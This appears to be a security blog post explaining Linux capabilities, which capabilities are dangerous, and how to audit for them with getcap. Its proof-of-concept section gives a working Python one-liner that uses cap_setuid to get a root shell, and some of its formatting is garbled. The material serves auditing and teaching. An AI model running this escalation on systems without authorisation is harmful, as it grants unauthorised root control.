---
layout: post
title: "Linux Security - Capabilities"
date: 2025-11-12 10:00:00 +0000
categories: [linux-security]
tags: [linux-security]
author: Application Security Engineer
comments: true
excerpt: "Linux Capabilities breaks monolithic root privileges into fine-grained, modular permissions. Capabilities also integrate deeply security frameworks such as namespaces, containers, SELinux, and systemd so it is essential for securing Linux systems, developing hardened applications, or operating containerized environments"
---

# Linux Security Internals: Capabilities

## 1. The Concept: "Sliced" Root
Historically, Linux privilege was binary:
* **Root (UID 0):** God mode (Access to network, files, hardware, etc.).
* **Regular User:** Limited access.

**The Problem:** If a small utility (like `ping`) needs to open a raw network socket, it traditionally needed SUID Root. This gave `ping` permission to do *everything else* root can do (like read `/etc/shadow`), which violates the Principle of Least Privilege.

**The Solution (Capabilities):**
The kernel breaks the power of Root into distinct, small slices called **Capabilities**. You can grant a binary *just* the specific power it needs without granting full UID 0 status.


## 2. Why this matters for Security Reviews
Admins often view Capabilities as a "hardening" measure. They might remove the SUID bit from a binary to make it "safe," but then assign it a Capability that is effectively just as dangerous.

**The Blind Spot:** Standard audit commands like `ls -l` or `find -perm -4000` **will not show capabilities**. A binary can look perfectly safe in a file listing but still grant root-level power.

---

## 3. The "Dangerous" Capabilities
Not all capabilities are high risk (e.g., `CAP_NET_BIND_SERVICE` is common for web servers). However, the following are **Critical Findings** if found on interpreters, editors, or compilers.

| Capability | What it allows | The Risk (Exploit) |
| :--- | :--- | :--- |
| **CAP_SETUID** | The process can change its UID. | **Critical.** Equivalent to SUID Root. An attacker can map their UID to 0 (Root) immediately. |
| **CAP_DAC_OVERRIDE** | Bypasses file permission checks (DAC). | "Discretionary Access Control Override." Allows reading/writing **any** file (like `/etc/shadow`) regardless of owner/permissions. |
| **CAP_CHOWN** | Allows changing file ownership. | An attacker can change the owner of critical system files to themselves, then modify them. |
| **CAP_SYS_MODULE** | Allows loading/unloading kernel modules. | Allows loading rootkits directly into the kernel. |
| **CAP_SYS_ADMIN** | The "Kitchen Sink." | Includes mounting filesystems, debugging processes, and many other root powers. Basically full Root. |

---

## 4. Hands-On: Auditing & Hunting
You need the `getcap` utility to see these permissions.

**The Audit Command:**
```bash
/usr/sbin/getcap -r / 2>/dev/null

Analyzing Output:Safe/Normal:Plaintext/usr/bin/ping = cap_net_raw+ep
/usr/bin/dumpcap = cap_net_admin,cap_net_raw+eip
Critical/Malicious:Plaintext/usr/bin/python3.8 = cap_setuid+ep
/usr/bin/vim = cap_dac_override+ep
```

##  5. Exploit Case Study (Proof of Concept)
If you find python3 has the cap_setuid capability, here is how a regular user escalates to root:

**1. Verify the capability**
```bash
# 1. Verify the capability
getcap /usr/bin/python3
# Output: /usr/bin/python3 = cap_setuid+ep

# 2. Execute the exploit
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# 3. Result
# You are dropped into a root shell (#)
```

**3. Result**

You are dropped into a root shell (#)

## 6. Comparison: SUID vs. Capabilities
Feature SUID Capabilities Visibility High (ls -l, red highlight)Hidden (Requires getcap)GranularityAll or Nothing (Full Root)Specific Powers (Network, File, UID)ScopeAffects the whole processSpecific threads/processesReview StrategyCheck for s bitCheck for cap_setuid, cap_dac_override
